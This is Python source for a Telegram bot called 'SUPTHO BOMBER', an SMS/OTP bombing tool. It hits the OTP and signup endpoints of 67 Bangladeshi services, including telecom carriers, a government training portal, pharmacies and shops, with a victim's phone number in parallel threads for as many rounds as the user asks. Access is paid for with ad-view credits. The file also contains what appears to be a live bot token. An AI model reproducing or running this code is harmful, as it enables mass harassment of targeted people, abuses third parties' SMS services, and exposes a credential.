import telebot
import requests
import threading
import os
import json
import random
import string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask
from telebot import types

# ==========================================
# 🌐 WEB SERVER (Keep Alive for Render)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Supreme Bot is Online!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  
OWNER_ID = 6941003064              
CHANNEL_ID = "@SH_tricks"         
DATA_FILE = 'supreme_db.json'
ADSTERRA_URL = "https://www.effectivegatecpm.com/wnbk2zjv?key=75442aee9e8b64a0d71c17a99228474d"

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE): return {"users": {}, "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🚀 API ENGINE (All 67 APIs)
# ==========================================

def mygp_api(target):
    try: requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={target}&lang=en&ng=0", timeout=3)
    except: pass

def fundesh_get_api(target):
    try: requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={target}", timeout=3)
    except: pass

def training_gov_api(target):
    try: requests.post("https://training.gov.bd/backoffice/api/user/sendOtp", json={"phone": target}, timeout=3)
    except: pass

def robi_da_api(target):
    try: requests.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": target}, timeout=3)
    except: pass

def easy_api(target):
    try: requests.post("https://core.easy.com.bd/api/v1/registration", json={"mobile": target}, timeout=3)
    except: pass

def etestpaper_api(target):
    try: requests.post("https://prod.etestpaper.net/api/auth/signup", json={"phone": target}, timeout=3)
    except: pass

def foodaholic_api(target):
    try: requests.post("https://foodaholic.com.bd/api/v1/auth/sign-up", json={"phone": target}, timeout=3)
    except: pass

def walton_api(target):
    try: requests.post("https://waltonplaza.com.bd/api/auth/otp/create", json={"phone": target}, timeout=3)
    except: pass

def foodcollections_api(target):
    try: requests.post("https://foodcollections.com/api/v1/auth/login", json={"phone": target}, timeout=3)
    except: pass

def chokrojan_api(target):
    try: requests.post("https://chokrojan.com/api/v1/passenger/login/mobile", json={"mobile_number": target}, timeout=3)
    except: pass

def proiojon_api(target):
    try: requests.post("https://billing.proiojon.com/api/v1/auth/login", json={"phone": target}, timeout=3)
    except: pass

def qcoom_api(target):
    try: requests.post("https://auth.qcoom.com/api/v1/otp/send", json={"mobileNumber": target}, timeout=3)
    except: pass

def pbs_api(target):
    try: requests.post("https://pbs.com.bd/login/?handler=UserGetOtp", data={"MobileNo": target}, timeout=3)
    except: pass

def shikho_api(target):
    try: requests.post("https://api.shikho.com/auth/v2/send/sms", json={"phone": target}, timeout=3)
    except: pass

def doctime_api(target):
    try: requests.post("https://api.doctime.com.bd/api/v2/authenticate", json={"contact_no": target}, timeout=3)
    except: pass

def kabbik_api(target):
    try: requests.post("https://api.kabbik.com/v1/auth/otpnew", json={"msisdn": target}, timeout=3)
    except: pass

def mbonline_api(target):
    try: requests.post("https://mbonlineapi.com/api/front/send/otp", json={"CellPhone": target}, timeout=3)
    except: pass

def sindabad_api(target):
    try: requests.post("https://offers.sindabad.com/api/mobile-otp", json={"mobile": target}, timeout=3)
    except: pass

def bl_eshop_api(target):
    try: requests.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", json={"phone": target}, timeout=3)
    except: pass

def lazzpharma_api(target):
    try: requests.post("https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister", json={"Phone": target}, timeout=3)
    except: pass

def medha_api(target):
    try: requests.post("https://developer.medha.info/api/send-otp", json={"phone": target}, timeout=3)
    except: pass

def robi_web_api(target):
    try: requests.post("https://webloginda.robi.com.bd/backend/api/v1/otp", json={"phone_number": target}, timeout=3)
    except: pass

def ali2bd_api(target):
    try: requests.post("https://edge.ali2bd.com/api/consumer/v1/auth/login", json={"username": target}, timeout=3)
    except: pass

def chardike_api(target):
    try: requests.post("https://api.chardike.com/api/otp/send", json={"phone": target}, timeout=3)
    except: pass

def englishmoja_api(target):
    try: requests.post("https://api.englishmojabd.com/api/v1/auth/login", json={"phone": target}, timeout=3)
    except: pass

def gorillamove_api(target):
    try: requests.post("https://api.gorillamove.com/api/v1/core/account/phone_login", json={"phone_number": target}, timeout=3)
    except: pass

def manambd_api(target):
    try: requests.post("https://manambd.com/_public/api/send/otp", json={"mobile_no": target}, timeout=3)
    except: pass

def shwapno_api(target):
    try: requests.post("https://www.shwapno.com/api/auth", json={"phoneNumber": target}, timeout=3)
    except: pass

def ghoorilearning_api(target):
    try: requests.post("https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn", json={"mobile_no": target}, timeout=3)
    except: pass

def moveon_api(target):
    try: requests.post("https://moveonbd.com/api/v1/customer/auth/phone/request-otp", json={"phone": target}, timeout=3)
    except: pass

def swap_v2_api(target):
    try: requests.post("https://api.swap.com.bd/api/v1/send-otp/v2", json={"phone": target}, timeout=3)
    except: pass

def arogga_api(target):
    try: requests.post("https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome", data={"mobile": target}, timeout=3)
    except: pass

def binge_v3_api(target):
    try: requests.get(f"https://web-api.binge.buzz/api/v3/otp/send/{target}", timeout=3)
    except: pass

def khaasfood_api(target):
    try: requests.post("https://www.khaasfood.com/wp-admin/admin-ajax.php", data={"mobileNo": target}, timeout=3)
    except: pass

def rokomari_api(target):
    try: requests.post(f"https://www.rokomari.com/otp/send?emailOrPhone={target}&countryCode=BD", timeout=3)
    except: pass

def medeasy_api(target):
    try: requests.get(f"https://api.medeasy.health/api/send-otp/{target}/", timeout=3)
    except: pass

def xbet_api(target):
    try: requests.post("https://1x-bet.mobi/web-api/api/web/registration/v2/sms", json={"data":{"attributes":{"phone": target[-10:], "country_code": "880"}}}, timeout=3)
    except: pass

def gpfi_api(target):
    try: requests.post("https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": target}, timeout=3)
    except: pass

def chorcha_register_api(target):
    try: requests.post("https://mujib.chorcha.net/auth/register", json={"name": "User", "phone": target, "password": "Password123"}, timeout=3)
    except: pass

def beautybooth_api(target):
    try: requests.post("https://admin.beautybooth.com.bd/api/v2/auth/register", json={"value": target, "type": "phone"}, timeout=3)
    except: pass

def sailor_api(target):
    try: requests.post("https://backend.sailor.clothing/api/v2/auth/signup", json={"phone": target, "password": "Password123@"}, timeout=3)
    except: pass

def rangs_api(target):
    try: requests.post("https://ecom.rangs.com.bd/send-otp-code", json={"mobile": f"+88{target}"}, timeout=3)
    except: pass

def binge_api(target):
    try: requests.post("https://api.binge.buzz/api/v4/auth/otp/send", json={"phone": f"+88{target}"}, timeout=3)
    except: pass

def kfc_api(target):
    try: requests.post("https://kfcbd.com/livewire/message/home.login", json={"updates": [{"type":"syncInput","payload":{"name":"mobile","value": target}}]}, timeout=3)
    except: pass

def acs_api(target):
    try: requests.post("https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", json={"phone": target}, timeout=3)
    except: pass

def bdtickets_api(target):
    try: requests.post("https://api.bdtickets.com/v1/auth", json={"phoneNumber": f"+88{target}"}, timeout=3)
    except: pass

def robi_api(target):
    try: requests.post("https://www.robi.com.bd/bn", data=f'[{"{"}"msisdn":"{target}"{"}"}]', timeout=3)
    except: pass

def airtel_api(target):
    try: requests.post("https://www.bd.airtel.com/en", data=f'[{"{"}"msisdn":"{target}"{"}"}]', timeout=3)
    except: pass

def grameenphone_api(target):
    try: requests.post("https://webloginda.grameenphone.com/backend/api/v1/otp", data=f"msisdn={target}", timeout=3)
    except: pass

def apex_api(target):
    try: requests.post("https://api.apex4u.com/api/auth/login", json={"phoneNumber": target}, timeout=3)
    except: pass

def bikroy_api(target):
    try: requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", timeout=3)
    except: pass

def banglalink_api(target):
    try: requests.post("https://web-api.banglalink.net/api/v1/user/otp-login/request", json={"mobile": target}, timeout=3)
    except: pass

def chorki_api(target):
    try: requests.post("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=3)
    except: pass

def hoichoi_api(target):
    try: requests.post("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", json={"phoneNumber": f"+88{target}"}, timeout=3)
    except: pass

def bioscope_api(target):
    try: requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=3)
    except: pass

def bohubrihi_api(target):
    try: requests.post("https://bb-api.bohubrihi.com/public/activity/otp", json={"phone": target, "intent": "login"}, timeout=3)
    except: pass

def ecourier_api(target):
    try: requests.get(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", timeout=3)
    except: pass

def osudpotro_api(target):
    try: requests.post("https://api.osudpotro.com/api/v1/users/send_otp", json={"mobile": f"+88-{target}"}, timeout=3)
    except: pass

def fundesh_api(target):
    try: requests.post("https://fundesh.com.bd/api/auth/resendOTP", json={"msisdn": target[-10:]}, timeout=3)
    except: pass

def paperfly_api(target):
    try: requests.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", json={"phone_number": target}, timeout=3)
    except: pass

def sundarban_api(target):
    try: requests.post("https://api-gateway.sundarbancourierltd.com/graphql", json={"variables": {"accessTokenFilter": {"userName": target}}}, timeout=3)
    except: pass

def hishabee_api(target):
    try: requests.post(f"https://app.hishabee.business/api/V2/otp/send?mobile_number={target}", timeout=3)
    except: pass

def shomvob_api(target):
    try: requests.post("https://backend-api.shomvob.co/api/v2/otp/phone", json={"phone": f"88{target}"}, timeout=3)
    except: pass

def deeptoplay_api(target):
    try: requests.post("https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web", json={"number": f"+88{target}"}, timeout=3)
    except: pass

def redx_api(target):
    try: requests.post("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", json={"phoneNumber": target}, timeout=3)
    except: pass

def cokestudio_api(target):
    try: requests.post("https://cokestudio23.sslwireless.com/api/store-and-send-otp", json={"msisdn": "880" + target[-10:]}, timeout=3)
    except: pass

def swap_api(target):
    try: requests.post("https://api.swap.com.bd/api/v1/send-otp", json={"phone": "0" + target[-10:]}, timeout=3)
    except: pass

def prothomalo_api(target):
    try: requests.post("https://prod-api.viewlift.com/identity/signup?site=prothomalo", json={"phoneNumber": "+880" + target[-10:]}, timeout=3)
    except: pass

def attack_executor(target, amount):
    apis = [mygp_api, fundesh_get_api, training_gov_api, robi_da_api, easy_api, etestpaper_api, foodaholic_api, walton_api, foodcollections_api, chokrojan_api, proiojon_api, qcoom_api, pbs_api, shikho_api, doctime_api, kabbik_api, mbonline_api, sindabad_api, bl_eshop_api, lazzpharma_api, medha_api, robi_web_api, ali2bd_api, chardike_api, englishmoja_api, gorillamove_api, manambd_api, shwapno_api, ghoorilearning_api, moveon_api, swap_v2_api, arogga_api, binge_v3_api, khaasfood_api, rokomari_api, medeasy_api, xbet_api, gpfi_api, chorcha_register_api, beautybooth_api, sailor_api, rangs_api, binge_api, kfc_api, acs_api, bdtickets_api, robi_api, grameenphone_api, apex_api, bikroy_api, banglalink_api, airtel_api, chorki_api, hoichoi_api, bioscope_api, bohubrihi_api, ecourier_api, osudpotro_api, fundesh_api, paperfly_api, sundarban_api, hishabee_api, shomvob_api, deeptoplay_api, redx_api, cokestudio_api, swap_api, prothomalo_api]
    with ThreadPoolExecutor(max_workers=80) as executor:
        for _ in range(amount):
            for run_api in apis: executor.submit(run_api, target)

# ==========================================
# 🤖 BOT LOGIC
# ==========================================

def is_joined(user_id):
    if int(user_id) == int(OWNER_ID): return True
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    if uid not in db['users']: 
        db['users'][uid] = {"credits": 0, "plan": "free"}
        save_data(db)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Bomb", "👤 Profile", "💎 Get Free Credits", "👥 Refer & Earn")
    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER** 🔥", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def menu_logic(message):
    uid = str(message.from_user.id)
    if not is_joined(uid):
        btn = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("Join Channel 📢", url=f"https://t.me/{CHANNEL_ID.replace('@','')}"))
        return bot.reply_to(message, "❌ আগে চ্যানেলে জয়েন করুন!", reply_markup=btn)
    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 নাম্বার দিন:")
        bot.register_next_step_handler(msg, ask_amount)
    elif message.text == "👤 Profile":
        u = db['users'].get(uid, {})
        cred = "Unlimited" if int(uid) == int(OWNER_ID) or u.get('plan') == 'vip' else u.get('credits', 0)
        bot.reply_to(message, f"👤 **PROFILE**\n\n🆔 ID: `{uid}`\n💰 Balance: `{cred}`", parse_mode='Markdown')
    elif message.text == "💎 Get Free Credits":
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔗 Watch Ad", url=ADSTERRA_URL), types.InlineKeyboardButton("✅ Claim 10 Credits", callback_data="verify_ads"))
        bot.send_message(message.chat.id, "অ্যাড দেখে Claim বাটনে চাপ দিন:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify_ads")
def verify_ads(call):
    uid = str(call.from_user.id)
    db['users'][uid]['credits'] += 10
    save_data(db); bot.answer_callback_query(call.id, "🎉 +10 Credits!"); bot.edit_message_text("✅ ক্রেডিট যোগ হয়েছে।", call.message.chat.id, call.message.message_id)

def ask_amount(message):
    target = message.text
    msg = bot.reply_to(message, "🔢 কত রাউন্ড?")
    bot.register_next_step_handler(msg, process_bomb, target)

def process_bomb(message, target):
    uid = str(message.from_user.id)
    u_data = db['users'].get(uid, {})
    try:
        amount = int(message.text)
        if int(uid) != int(OWNER_ID) and u_data.get('plan') != 'vip':
            if u_data['credits'] < 1: return bot.reply_to(message, "⚠️ ক্রেডিট নেই!")
            db['users'][uid]['credits'] -= 1; save_data(db)
        bot.reply_to(message, "🚀 বোম্বিং শুরু হয়েছে!")
        threading.Thread(target=attack_executor, args=(target, amount)).start()
    except: bot.reply_to(message, "❌ ভুল ইনপুট!")

if __name__ == "__main__":
    keep_alive()
    bot.remove_webhook()
    bot.polling(non_stop=True)
